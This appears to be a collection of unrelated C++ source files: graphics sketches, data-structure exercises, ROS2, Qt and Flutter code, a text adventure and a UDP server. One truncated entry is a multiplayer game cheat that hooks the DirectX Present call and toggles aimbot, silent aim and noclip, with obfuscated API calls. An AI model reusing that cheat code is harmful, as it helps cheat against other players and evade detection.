{\r\n\r\n\tofSeedRandom(39);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nvoid ofApp::draw() {\r\n\r\n\tthis->cam.begin();\r\n\tofRotateZ(ofGetFrameNum() * 0.77);\r\n\r\n\tfor (int i = 0; i < this->box_list.size(); i++) {\r\n\r\n\t\tauto color = get<0>(this->box_list[i]);\r\n\t\tauto location = get<1>(this->box_list[i]);\r\n\t\tauto radius = get<2>(this->box_list[i]);\r\n\r\n\t\tofPushMatrix();\r\n\t\tofTranslate(location);\r\n\r\n\t\tfor (int k = 0; k < 8; k++) {\r\n\r\n\t\t\tauto noise_seed = glm::vec3(ofRandom(1000), ofRandom(1000), ofRandom(1000));\r\n\t\t\tcolor.setHsb(int(color.getHue() + 32) % 255, 255, 255);\r\n\r\n\t\t\tfor (int m = 0; m < 200; m++) {\r\n\t\t\t\t\r\n\t\t\t\tofSetColor(color, ofMap(m, 0, 200, 32, 255));\r\n\r\n\t\t\t\tauto vertex = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, m * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tauto next = glm::vec3(\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.x, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.y, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85),\r\n\t\t\t\t\tofMap(ofNoise(noise_seed.z, (m + 1) * 0.005 + ofGetFrameNum() * 0.085), 0, 1, -radius * 0.85, radius * 0.85)\r\n\t\t\t\t);\r\n\r\n\t\t\t\tvertex = glm::normalize(vertex) * radius * 0.9;\r\n\t\t\t\tnext = glm::normalize(next) * radius * 0.9;\r\n\r\n\t\t\t\tofDrawLine(vertex, next);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tofPopMatrix();\r\n\t}\r\n\r\n\tthis->cam.end();\r\n\r\n\t/*\r\n\tint start = 250;\r\n\tif (ofGetFrameNum() > start) {\r\n\r\n\t\tostringstream os;\r\n\t\tos << setw(4) << setfill('0') << ofGetFrameNum() - start;\r\n\t\tofImage image;\r\n\t\timage.grabScreen(0, 0, ofGetWidth(), ofGetHeight());\r\n\t\timage.saveImage(\"image/cap/img_\" + os.str() + \".jpg\");\r\n\t\tif (ofGetFrameNum() - start >= 25 * 20) {\r\n\r\n\t\t\tstd::exit(1);\r\n\t\t}\r\n\t}\r\n\t*/\r\n}\r\n\r\n//--------------------------------------------------------------\r\nglm::vec3 ofApp::make_point(float R, float r, float u, float v) {\r\n\r\n\t// \u6570\u5b66\u30c7\u30c3\u30b5\u30f3\u6559\u5ba4 \u63cf\u3044\u3066\u697d\u3057\u3080\u6570\u5b66\u305f\u3061\u3000P.31\r\n\r\n\tu *= DEG_TO_RAD;\r\n\tv *= DEG_TO_RAD;\r\n\r\n\tauto x = (R + r * cos(u)) * cos(v);\r\n\tauto y = (R + r * cos(u)) * sin(v);\r\n\tauto z = r * sin(u);\r\n\r\n\treturn glm::vec3(x, y, z);\r\n}\r\n\r\n//--------------------------------------------------------------\r\nint main() {\r\n\r\n\tofSetupOpenGL(720, 720, OF_WINDOW);\r\n\tofRunApp(new ofApp());\r\n}",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass node {\r\npublic:\r\n    int data;\r\n    node *next;\r\n\r\n    // constructor\r\n    node(int d) {\r\n        this->data = d;\r\n        this->next = NULL;\r\n    }\r\n\r\n    ~node() {\r\n        int value = this->data;\r\n        if (this->next != NULL) {\r\n            delete next;\r\n            next = NULL;\r\n        }\r\n        cout << \"Memory is free for node with data \" << value << endl;\r\n    }\r\n};\r\n\r\nvoid insertnode(node *&tail, int elt, int d) {\r\n    // assuming that the element is present in the list\r\n\r\n    // empty list\r\n    if (tail == NULL) {\r\n        node *newnode = new node(d);\r\n        tail = newnode;\r\n        newnode->next = newnode;\r\n    }\r\n    else{\r\n    // non-empty list\r\n    node *curr = tail;\r\n    while (curr->data != elt) {\r\n        curr = curr->next;\r\n    }\r\n    node *temp = new node(d);\r\n    temp->next = curr->next;\r\n    curr->next = temp;\r\n}\r\n} \r\n\r\nvoid deletenode(node*&tail,int value){\r\n    //empty list\r\n    if(tail==NULL){\r\n        cout<<\"List is empty, please check again \"<<endl;\r\n    }\r\n    else{\r\n        //non empty\r\n        //assuming that \"value\"is present int the linked list\r\n        node*prev=tail;\r\n        node*curr=prev->next;\r\n\r\n        while(curr->data!=value){\r\n            prev=curr;\r\n            curr=curr->next;\r\n        }\r\n        prev->next=curr->next;\r\n        if(tail==curr){\r\n            tail=prev;\r\n        }\r\n        curr->next=NULL;\r\n        delete curr;\r\n    }\r\n\r\n}\r\n\r\nvoid print(node*tail) {\r\n    node *temp = tail;\r\n      if(tail==NULL){\r\n        cout<<\"List is empty, please check again \"<<endl;\r\n        return;\r\n    }\r\n    do {\r\n        cout << tail->data << \" \";\r\n         tail = tail->next;\r\n    } while ( tail != temp);\r\n    cout << endl;\r\n}\r\n\r\nint main() {\r\n    node *tail = NULL;\r\n    insertnode(tail, 5, 3);\r\n    print(tail);\r\n    insertnode(tail, 3, 5);\r\n    print(tail);\r\n    insertnode(tail, 5, 7);\r\n    print(tail);\r\n    insertnode(tail, 7, 9);\r\n    print(tail);\r\n    insertnode(tail, 9, 15);\r\n    print(tail);\r\n    insertnode(tail, 9, 80);\r\n    print(tail);\r\n    insertnode(tail, 30, 10);\r\n    print(tail);\r\n    deletenode(tail,7);\r\n    print(tail);\r\n    return 0;\r\n}\r\n",
    "// Filename: stereo_image_splitter.cpp\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"sensor_msgs/msg/image.hpp\"\n#include <memory>\n#include <opencv2/opencv.hpp>\n#include <cv_bridge/cv_bridge.h>\n\nclass StereoImageSplitter : public rclcpp::Node\n{\npublic:\n  // Update the constructor to accept NodeOptions\n  explicit StereoImageSplitter(const rclcpp::NodeOptions & options = rclcpp::NodeOptions())\n  : Node(\"stereo_image_splitter\", options)\n  {\n    this->declare_parameter<bool>(\"is_grey\", false);\n    this->get_parameter(\"is_grey\", is_grey_);\n\n    // Your subscription and publisher setup remains the same\n    subscription_ = this->create_subscription<sensor_msgs::msg::Image>(\n      \"stitched_images\", 10,\n      std::bind(&StereoImageSplitter::split_and_publish, this, std::placeholders::_1));\n\n    left_publisher_ = this->create_publisher<sensor_msgs::msg::Image>(\"left_image\", 10);\n    right_publisher_ = this->create_publisher<sensor_msgs::msg::Image>(\"right_image\", 10);\n  }\n\nprivate:\n  void split_and_publish(const sensor_msgs::msg::Image::SharedPtr msg) {\n        cv_bridge::CvImagePtr cv_ptr;\n        try {\n            // Direct conversion to cv::Mat with cv_bridge handling common encodings\n            cv_ptr = cv_bridge::toCvCopy(msg);\n        } catch (cv_bridge::Exception& e) {\n            RCLCPP_ERROR(this->get_logger(), \"cv_bridge exception: %s\", e.what());\n            return;\n        }\n\n        // Check source encoding and convert if necessary\n        cv::Mat processed_image;\n        if (msg->encoding == \"yuv422_yuy2\") {\n            // Convert YUV422 (YUY2) to BGR for processing\n            cv::cvtColor(cv_ptr->image, processed_image, cv::COLOR_YUV2BGR_YUY2);\n        } else if (msg->encoding == \"rgb8\") {\n            // Assume the source is BGR if not grayscale and not YUY2. Adjust if your camera uses RGB.\n            // processed_image = cv_ptr->image.clone();\n            cv::cvtColor(cv_ptr->image, processed_image, cv::COLOR_RGB2BGR);\n        } else if (msg->encoding == \"rgba8\") {\n            // Assume the source is BGR if not grayscale and not YUY2. Adjust if your camera uses RGB.\n            // processed_image = cv_ptr->image.clone();\n            cv::cvtColor(cv_ptr->image, processed_image, cv::COLOR_RGBA2BGR);\n        } else{\n            processed_image = cv_ptr->image.clone();\n        }\n\n        // Additional check for grayscale conversion\n        if (is_grey_) {\n            if (processed_image.channels() > 1) {\n                // Convert BGR  to Grayscale\n                cv::cvtColor(processed_image, processed_image, cv::COLOR_BGR2GRAY);\n            }\n        } else if (processed_image.empty()) {\n            // For cases where the encoding is not 'yuv422_yuy2' but still color\n            processed_image = cv_ptr->image.clone();\n        }\n\n        // Split the image into left and right halves\n        int width = processed_image.cols / 2;\n        int height = processed_image.rows;\n\n        cv::Mat right_image = processed_image(cv::Rect(0, 0, width, height));\n        cv::Mat left_image = processed_image(cv::Rect(width, 0, width, height));\n\n        // Set the appropriate encoding for publishing\n        std::string encoding = is_grey_ ? \"mono8\" : \"bgr8\";\n\n        // Publish the left and right images\n        cv_bridge::CvImage left_msg(cv_ptr->header, encoding, left_image);\n        cv_bridge::CvImage right_msg(cv_ptr->header, encoding, right_image);\n\n        left_publisher_->publish(*left_msg.toImageMsg());\n        right_publisher_->publish(*right_msg.toImageMsg());\n    }\n\n  rclcpp::Subscription<sensor_msgs::msg::Image>::SharedPtr subscription_;\n  rclcpp::Publisher<sensor_msgs::msg::Image>::SharedPtr left_publisher_;\n  rclcpp::Publisher<sensor_msgs::msg::Image>::SharedPtr right_publisher_;\n  bool is_grey_; // Flag indicating if the input images are grayscale\n};\n\n#include \"rclcpp_components/register_node_macro.hpp\"\nRCLCPP_COMPONENTS_REGISTER_NODE(StereoImageSplitter)\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "/*!\n\tSPDX-FileCopyrightText: 2018-2024 Igor Mironchik <igor.mironchik@gmail.com>\n\tSPDX-License-Identifier: GPL-3.0-or-later\n*/\n\n// GIF editor include.\n#include \"busyindicator.hpp\"\n\n// Qt include.\n#include <QPainter>\n#include <QVariantAnimation>\n#include <QPainterPath>\n\n\n//\n// BusyIndicatorPrivate\n//\n\nclass BusyIndicatorPrivate {\npublic:\n\tBusyIndicatorPrivate( BusyIndicator * parent )\n\t\t:\touterRadius( 10 )\n\t\t,\tinnerRadius( static_cast< int > ( outerRadius * 0.6 ) )\n\t\t,\tsize( outerRadius * 2, outerRadius * 2 )\n\t\t,\trunning( true )\n\t\t,\tanimation( nullptr )\n\t\t,\tq( parent )\n\t{\n\t}\n\n\tvoid init();\n\n\tint outerRadius;\n\tint innerRadius;\n\tint percent = 0;\n\tQSize size;\n\tQColor color;\n\tbool running;\n\tbool showPercent = false;\n\tQVariantAnimation * animation;\n\tBusyIndicator * q;\n}; // class BusyIndicatorPrivate\n\nvoid\nBusyIndicatorPrivate::init()\n{\n\tanimation = new QVariantAnimation( q );\n\tanimation->setStartValue( 0.0 );\n\tanimation->setEndValue( 359.0 );\n\tanimation->setDuration( 1000 );\n\tanimation->setLoopCount( -1 );\n\n\tQObject::connect( animation, &QVariantAnimation::valueChanged,\n\t\tq, &BusyIndicator::_q_update );\n\n\tcolor = q->palette().color( QPalette::Highlight );\n\n\tanimation->start();\n}\n\n\n//\n// BusyIndicator\n//\n\nBusyIndicator::BusyIndicator( QWidget * parent )\n\t:\tQWidget( parent )\n\t,\td( new BusyIndicatorPrivate( this ) )\n{\n\td->init();\n}\n\nBusyIndicator::~BusyIndicator() noexcept\n{\n\td->animation->stop();\n}\n\nbool\nBusyIndicator::isRunning() const\n{\n\treturn d->running;\n}\n\nvoid\nBusyIndicator::setRunning( bool on )\n{\n\tif( on != d->running )\n\t{\n\t\td->running = on;\n\n\t\tif( d->running )\n\t\t{\n\t\t\tshow();\n\t\t\td->animation->start();\n\t\t}\n\t\telse\n\t\t{\n\t\t\thide();\n\t\t\td->animation->stop();\n\t\t}\n\t}\n}\n\nconst QColor &\nBusyIndicator::color() const\n{\n\treturn d->color;\n}\n\nvoid\nBusyIndicator::setColor( const QColor & c )\n{\n\tif( d->color != c )\n\t{\n\t\td->color = c;\n\t\tupdate();\n\t}\n}\n\nint\nBusyIndicator::radius() const\n{\n\treturn d->outerRadius;\n}\n\nvoid\nBusyIndicator::setRadius( int r )\n{\n\tif( d->outerRadius != r )\n\t{\n\t\td->outerRadius = r;\n\t\td->innerRadius = static_cast< int > ( d->outerRadius * 0.6 );\n\t\td->size = QSize( d->outerRadius * 2, d->outerRadius * 2 );\n\n\t\tupdateGeometry();\n\t}\n}\n\nint\nBusyIndicator::percent() const\n{\n\treturn d->percent;\n}\n\nvoid\nBusyIndicator::setPercent( int p )\n{\n\tif( d->percent != p )\n\t{\n\t\td->percent = p;\n\t\t\n\t\tif( d->showPercent )\n\t\t\tupdate();\n\t}\n}\n\nbool\nBusyIndicator::showPercent() const\n{\n\treturn d->showPercent;\n}\n\nvoid\nBusyIndicator::setShowPercent( bool on )\n{\n\tif( d->showPercent != on )\n\t{\n\t\td->showPercent = on;\n\t\t\n\t\tupdate();\n\t}\n}\n\nQSize\nBusyIndicator::minimumSizeHint() const\n{\n\treturn d->size;\n}\n\nQSize\nBusyIndicator::sizeHint() const\n{\n\treturn d->size;\n}\n\nvoid\nBusyIndicator::paintEvent( QPaintEvent * )\n{\n\tQPainter p( this );\n\tp.setRenderHint( QPainter::Antialiasing );\n\tp.translate( width() / 2, height() / 2 );\n\n\tQPainterPath path;\n\tpath.setFillRule( Qt::OddEvenFill );\n\tpath.addEllipse( - d->outerRadius, - d->outerRadius,\n\t\td->outerRadius * 2, d->outerRadius * 2 );\n\tpath.addEllipse( - d->innerRadius, - d->innerRadius,\n\t\td->innerRadius * 2, d->innerRadius * 2 );\n\n\tp.setPen( Qt::NoPen );\n\n\tQConicalGradient gradient( 0, 0, - d->animation->currentValue().toReal() );\n\tgradient.setColorAt( 0.0, Qt::transparent );\n\tgradient.setColorAt( 0.05, d->color );\n\tgradient.setColorAt( 1.0, Qt::transparent );\n\n\tp.setBrush( gradient );\n\n\tp.drawPath( path );\n\t\n\tif( d->showPercent )\n\t{\n\t\tp.setBrush( d->color );\n\t\tp.setPen( d->color );\n\t\tauto f = p.font();\n\t\tf.setPixelSize( qRound( (double) d->innerRadius * 0.8 ) );\n\t\tp.setFont( f );\n\t\tp.drawText( QRect( -d->innerRadius, -d->innerRadius,\n\t\t\t\td->innerRadius * 2, d->innerRadius * 2 ),\n\t\t\tQt::AlignHCenter | Qt::AlignVCenter,\n\t\t\tQString( \"%1%2\" ).arg( QString::number( d->percent ),\n\t\t\t\tQStringLiteral( \"%\" ) ) );\n\t}\n}\n\nvoid\nBusyIndicator::_q_update( const QVariant & )\n{\n\tupdate();\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <chrono>\r\n#include <thread>\r\n#include <iomanip>\r\n#include <vector>\r\n#include <algorithm>\r\n#include \"utility_functions.h\"\r\n#include \"combat.h\"\r\n#include \"sections.h\"\r\nusing namespace std;\r\n\r\nint execute_section(int section_number, int* player_health, vector<Section>& sections);\r\n\r\nint main() {\r\n\r\n\t// Initializing the game\r\n\tint section_number = 0;\r\n\tint player_health = 99;\r\n\tvector<Section> sections = { {4, 0, 0, { false, false, false, false}, \"00\", false, false },\r\n\t\t{6, 0, 0, { false, false, false, false, false, false }, \"0000\", false, false },\r\n\t\t{4, 0, 0, { false, false, false, false }, \"No door lock\", false, false }\r\n\t};\r\n\r\n\t//starting_scene(&player_health);\r\n\r\n\twhile (section_number != -1 || section_number != 100) {\r\n\t\tsection_number = execute_section(section_number, &player_health, sections);\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n\r\nint execute_section(int section_number, int* player_health, vector<Section>& sections) {\r\n\tswitch (section_number) {\r\n\tcase 0:\r\n\t\treturn starting_cell(player_health, sections[0]);\r\n\tcase 1:\r\n\t\treturn hallway(player_health);\r\n\tcase 2:\r\n\t\treturn guard_room(player_health, sections[1]);\r\n\tcase 3:\r\n\t\treturn river(player_health, sections);\r\n\tcase 4:\r\n\t\treturn forest(player_health, sections[2]);\r\n\tcase 5:\r\n\t\treturn castle(player_health);\r\n\tcase 6:\r\n\t\treturn graveyard(player_health);\r\n\tcase -1:\r\n\t\tclear();\r\n\t\toutput(\"You have run out of health. You watch the light fade as you dissolve into shadow.\");\r\n\t\tcout << endl;\r\n\t\toutput(\"(close the window and restart to play again)\");\r\n\t\tpause();\r\n\t\treturn -1;\r\n\tcase 100:\r\n\t\treturn 100;\r\n\tdefault:\r\n\t\toutput(\"Work in progress...\");\r\n\t}\r\n}",
    "/*\n\n* Author:       Rick Candell (rick.candell@nist.gov)\n*\n* Organization: National Institute of Standards and Technology\n*               U.S. Department of Commerce\n* License:      Public Domain\n\n*/\n// main.cpp : Defines the main() entry point for the console application.\n//\n\n#define USE_JSON_STR (0)\n\n#include <common.h>\n\n\nusing boost::asio::ip::udp;\nusing namespace std;\n\nint main(int argc, char* argv[])\n{\n\t// program option variables\n\tstring serverPort = \"17998\";\n\tstring bindAddr = \"127.0.0.1\";\n\n\n\t// program options\n\tnamespace po = boost::program_options;\n\tpo::options_description desc(\"Allowed options\");\n\tdesc.add_options()\n\t\t(\"help,h\",\t\t\t\t\t\t\t\t\t\t\t\t\t\"print the help message\")\n\t\t(\"port,p\",\t\tpo::value<string>(&serverPort),\t\t\t\"server port number\")\n\t\t(\"addr,a\",\t\tpo::value<string>(&bindAddr),\t\t\t\t\"bind address\")\n\t\t;\n\n\tpo::variables_map vm;\n\ttry\t{\n\t\tpo::store(po::parse_command_line(argc, argv, desc), vm);\n\t\tif (vm.count(\"help\"))\n\t\t{\n\t\t\tstd::cout << desc << std::endl;\n\t\t\treturn 